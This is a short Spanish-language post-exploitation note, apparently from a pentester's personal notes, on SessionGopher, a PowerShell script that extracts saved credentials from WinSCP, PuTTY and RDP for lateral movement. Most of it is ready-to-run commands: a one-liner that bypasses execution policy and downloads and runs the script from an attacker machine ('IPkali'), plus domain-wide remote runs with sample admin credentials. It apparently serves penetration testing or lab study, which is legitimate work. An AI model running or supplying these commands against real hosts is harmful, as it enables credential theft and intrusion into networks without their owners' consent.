SessionGopher permite enumerar contraseñas almacenadas en un host víctima, para poder realizar ataques de movimiento lateral.

Es un script de PowerShell, que recupera contraseñas usadas en aplicaciones como WinSCP, PuTTY, RDP, etc...

[SessionGopher](https://github.com/Arvanaghi/SessionGopher)

Lo descargamos a nuestra máquina atacante.

Lo transferimos mediante un servidor de python3 por el puerto 80.

Desde la máquina víctima lo transferimos desde el cmd con el siguiente comando.

```
powershell.exe -nop -ep bypass -C iex (New-Object Net.Webclient).DownloadString('http://IPkali/SessionGopher.ps1'); Invoke-SessionGopher
```

De esta forma lo descargamos y ejecutamos, y nos saca credenciales que pueden ser usadas para otros sistemas dentro de esa red interna o en la máquina la cual lanzamos SessionGopher.

![[Pasted image 20230124165444.png]]

```
powershell.exe -nop -ep bypass -C iex (New-Object Net.Webclient).DownloadString('http://IPkali/SessionGopher.ps1'); Invoke-SessionGopher -Thorough
```

Podemos utilziar ese parámetro nuevo para ver si sacamos algo más, el cual buscará en todo el sistema archivo de cierta .extensión

Para génerar un archivo csv podemos añadir el parámetro:

	-OutCSV

Para lanzarlo en un host específico

	-Target

PARA LANZAR SESSIONGOPHER DE FORMA REMOTA:

	Podemos indicarle el dominio\usuario y su contraseña para que busque por todo el dominio.

```
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

or

	Podemos indicarle un archivo con una lista de ordenadores, y dominio\usuario y su contraseña

```
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -iL computerlist.txt -u domain.com\adm-arvanaghi -p s3cr3tP@ss -o
```

or

	Podemos indicarle un único objetivo dando su hostname.

```
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Target brandonArvanaghi_win7 -Thorough
```

